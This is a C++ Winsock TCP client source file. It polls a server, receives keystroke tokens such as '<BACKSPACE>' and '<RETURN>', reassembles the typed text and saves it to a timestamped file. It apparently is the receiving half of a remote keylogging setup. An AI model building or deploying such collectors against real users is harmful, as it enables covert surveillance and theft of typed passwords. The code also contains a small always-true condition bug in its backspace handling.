#include "client.hpp"
#include "winsock2.h"
#include "ws2tcpip.h"
#include <memory>
#include <iostream>
#include <cstring>
#include <fstream>
#include <ctime>
#include <vector>
#include <string>
#include <algorithm>
#include <sstream>
#include <iterator>

namespace tcp 
{
	bool client(const char* ipv4_address, const char* port, bool& status) 
	{
		// Initialize winsock
		struct addrinfo *result = NULL;
		struct addrinfo *ptr = NULL;
		struct addrinfo hints; 

		memset(&hints, 0, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		WSAData wsadata;
		int iResult = WSAStartup(MAKEWORD(2, 2), &wsadata);

		if (iResult != 0) 
		{
			std::cerr << "WSAStartup failed with error: " << iResult << "\n";
			WSACleanup();
			return false;
		}

		// Resolve the server address and port
		iResult = getaddrinfo(ipv4_address, port, &hints, &result);

		if (iResult != 0) 
		{
			std::cerr << "getaddrinfo failed: " << iResult << "\n";
			WSACleanup();
			return false;
		}
		
		// Create a socket
		SOCKET ConnectSocket = INVALID_SOCKET;

		// Attempt to connect the first address returned by the call to getaddrinfo
		ptr = result;

		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

		if (ConnectSocket == INVALID_SOCKET)
		{
			std::cerr << "Error at socket(): " << WSAGetLastError() << "\n";
			freeaddrinfo(result);
			WSACleanup();
			return false;
		}

		// Connect to a server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		
		while (status && iResult == SOCKET_ERROR)
		{
			iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			std::cerr << "Unable to connect to server!\n";
			Sleep(1000);
		}

		if (status) {
			std::cout << "Successfully connected\n";
		}

		// Get current date and time
		std::time_t tnow = std::time(0);
		std::tm* now = std::localtime(&tnow);
		char datetime_buffer[80];
		std::strftime(datetime_buffer, 80, "%Y-%m-%d_%H-%M-%S", now);
		std::string str_datetime_buffer(datetime_buffer);

		// Initialize an output file for storing the receiving data
		std::ofstream outFile(str_datetime_buffer+".txt", std::ios_base::app);

		// Send and receive data
		char sendbuffer[512] = "requesting for data", recvbuffer[512]; 
		int irecvResult, isendResult;

		std::vector<std::string> buffer;

		isendResult = send(ConnectSocket, sendbuffer, sizeof(sendbuffer), 0);

		if (isendResult == SOCKET_ERROR)
		{
			std::cout << "send failed: " << WSAGetLastError() << "\n";
		}
		
		while (status) {

			isendResult = send(ConnectSocket, sendbuffer, sizeof(sendbuffer), 0);

			if (isendResult == SOCKET_ERROR)
			{
				std::cout << "send failed: " << WSAGetLastError() << "\n";
			}

			memset(recvbuffer, 0, sizeof(recvbuffer));
			irecvResult = recv(ConnectSocket, recvbuffer, sizeof(recvbuffer), 0);
			if (irecvResult > 0)
			{

				if (std::strcmp(recvbuffer, "<none>") != 0) 
				{
					std::string str(recvbuffer);
					if (std::strcmp(recvbuffer, "<BACKSPACE>") == 0)
					{
						if (buffer.size() != 0 && (buffer.back() != "\n" || buffer.back() != "<UP>" || buffer.back() != "<DOWN>")) {
							std::cout << "<BACKSPACE>";
							buffer.pop_back();
						}
					}
					else if (std::strcmp(recvbuffer, "<SPACE>") == 0)
					{
						std::cout << " ";
						buffer.push_back(" ");
					}
					else if (std::strcmp(recvbuffer, "<RETURN>") == 0)
					{
						std::cout << "\n";
						buffer.push_back("\n");
					}
					else
					{
						std::cout << recvbuffer;
						std::string str(recvbuffer);
						buffer.push_back(str);
					}
				}
					/*

				std::string str(recvbuffer);
				if (str == "\b") 
				{
					if (buffer.size() != 0)
					{
						buffer.pop_back();
					}
				} 
				else 
				{
					buffer.push_back(str);
				}
				*/
			}
			else if (irecvResult == 0) 
			{
				std::cout << "Server closed.\n";
				status = false;
			}
			else if (irecvResult < 0)
			{

				ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
				iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
				
				while (status && iResult == SOCKET_ERROR)
				{
					iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

					if (iResult == SOCKET_ERROR) 
						std::cerr << "\nUnable to connect to server!";

					Sleep(1000);
				}

				if (status) {
					
					std::cout << "\nSuccessfully connected\n";
					isendResult = send(ConnectSocket, sendbuffer, sizeof(sendbuffer), 0);

					if (isendResult == SOCKET_ERROR) 
						std::cout << "send failed: " << WSAGetLastError() << "\n";

				}
						Sleep(10);

				}

		}

		std::stringstream ss;
		std::copy(buffer.begin(), buffer.end(), std::ostream_iterator<std::string>(ss, ""));
		outFile << ss.str();

		// Disconnect
		closesocket(ConnectSocket);
		WSACleanup();

		return true;
	}
}
